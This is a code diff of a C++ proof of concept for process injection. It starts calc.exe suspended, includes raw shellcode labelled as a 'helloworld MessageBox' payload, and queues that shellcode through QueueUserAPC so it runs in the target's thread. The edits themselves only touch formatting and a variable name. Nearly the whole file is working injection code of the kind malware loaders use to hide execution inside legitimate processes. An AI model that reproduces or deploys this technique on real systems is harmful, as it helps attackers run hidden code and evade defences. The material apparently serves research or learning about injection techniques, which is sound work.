@@ -9,7 +9,7 @@ int main()
 	ZeroMemory(&si, sizeof(si));
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));
-	
+
 	//helloworld MessageBox
 	char shellcode[] = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
 		"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
@@ -22,9 +22,8 @@ int main()
 
 	int sc_len = sizeof(shellcode);
 	VOID CALLBACK APCProc();
-	
 
-	if(!CreateProcessA((LPCSTR)"C:\\Windows\\System32\\calc.exe", (LPSTR)NULL, (LPSECURITY_ATTRIBUTES)NULL, (LPSECURITY_ATTRIBUTES)NULL, (BOOL)FALSE, (DWORD)CREATE_SUSPENDED, (LPVOID)NULL, (LPCSTR)NULL, (LPSTARTUPINFOA)&si, (LPPROCESS_INFORMATION)&pi))
+	if (!CreateProcessA((LPCSTR)"C:\\Windows\\System32\\calc.exe", (LPSTR)NULL, (LPSECURITY_ATTRIBUTES)NULL, (LPSECURITY_ATTRIBUTES)NULL, (BOOL)FALSE, (DWORD)CREATE_SUSPENDED, (LPVOID)NULL, (LPCSTR)NULL, (LPSTARTUPINFOA)&si, (LPPROCESS_INFORMATION)&pi))
 	{
 		DWORD err = GetLastError();
 		std::cout << "CreatProcess Err: " << err << std::endl;
@@ -46,8 +45,8 @@ int main()
 			}
 			else
 			{
-				PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)addr;
-				if (!QueueUserAPC((PAPCFUNC)pfnThreadRtn, pi.hThread, NULL))
+				PTHREAD_START_ROUTINE pfnAPC = (PTHREAD_START_ROUTINE)addr;
+				if (!QueueUserAPC((PAPCFUNC)pfnAPC, pi.hThread, NULL))
 				{
 					DWORD err = GetLastError();
 					std::cout << "QueueUserAPC Err " << err << std::endl;
@@ -59,6 +58,5 @@ int main()
 			}
 		}
 	}
-
 	return 0;
 }
